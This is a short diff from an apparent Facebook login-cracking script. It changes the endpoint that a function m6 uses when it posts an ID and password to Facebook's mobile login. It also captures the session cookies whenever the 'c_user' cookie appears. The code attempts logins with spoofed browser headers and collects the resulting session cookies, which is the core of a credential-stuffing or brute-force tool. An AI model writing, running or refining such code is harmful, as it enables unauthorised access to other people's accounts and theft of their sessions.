@@ -1240,7 +1240,7 @@ def m6(idf,pwv):
    'referer': f'https://m.facebook.com/login/?wtsid=rdr_0HpBBBchEc4DCrXrX&refsrc=deprecated&_rdr',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-   lo = session.post("https://m.facebook.com/login/device-based/login/async/",data=info,headers=had).text
+   lo = session.post("https://free.facebook.com/login/device-based/login/async/",data=info,headers=had).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
